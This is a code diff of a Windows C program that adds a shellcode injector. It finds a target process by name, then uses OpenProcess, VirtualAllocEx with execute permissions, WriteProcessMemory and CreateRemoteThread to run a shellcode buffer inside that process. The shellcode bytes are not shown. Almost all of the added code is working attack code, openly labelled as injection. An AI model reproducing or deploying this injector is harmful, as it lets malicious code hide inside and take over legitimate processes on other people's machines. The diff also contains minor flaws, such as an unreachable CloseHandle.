@@ -39,26 +39,26 @@ int main(int i,char *a[])
 		printf("Usage %s <program name>",a[0]);
 		return 0;
 	}
-	
+
 	BOOL f=0;
 	HANDLE snap;
 	PROCESSENTRY32 pe32;
-	
+
 	snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
-	
+
 	if(snap==INVALID_HANDLE_VALUE)
 	{
 		printf("CreateToolhelp32Snapshot() Failed."); return 0;
 	}
-	
+
 	pe32.dwSize=sizeof(pe32);
-	
+
 	if(!Process32First(snap,&pe32))
 	{
 		printf("Process32First() Failed."); return 0;
 	}
-	
-	
+
+
 	do
 	{
 		if(0==strncmp(a[1],pe32.szExeFile,strlen(pe32.szExeFile)))
@@ -66,6 +66,50 @@ int main(int i,char *a[])
 			f=TRUE;
 			break;
 		}
-		
+
 	}while(Process32Next(snap,&pe32));
-	
+
+
+	if(!f)
+	{
+		printf("No infomation found about \"%s\" ",a[1]);
+	}
+	else
+	{
+		printf("Program name:%s\nProcess id: %d",pe32.szExeFile,pe32.th32ProcessID);
+		printf("\nInjecting shellcode");
+		inject(pe32.th32ProcessID);
+	}
+
+	return 0;
+}
+
+
+void inject(DWORD pid)
+{
+	HANDLE phd,h;
+	LPVOID shell;
+
+	phd=OpenProcess(PROCESS_ALL_ACCESS,0,pid);
+
+	if(phd==INVALID_HANDLE_VALUE)
+	{
+		printf("\nOpenProcess() Failed."); return ;
+	}
+
+	shell=VirtualAllocEx(phd,0,sizeof(shellcode),MEM_COMMIT,PAGE_EXECUTE_READWRITE);
+	if(shell==NULL)
+	{
+		printf("\nVirtualAllocEx() Failed"); return ; CloseHandle(phd);
+	}
+
+	WriteProcessMemory(phd,shell,shellcode,sizeof(shellcode),0);
+	printf("\nInjection successfull\n");
+	printf("Running Shellcode......\n");
+
+	h=CreateRemoteThread(phd,NULL,2046,(LPTHREAD_START_ROUTINE)shell,NULL,0,0);
+	if(h==NULL)
+	{
+		printf("Failed to Run Shellcode\n"); return ;
+	}
+}
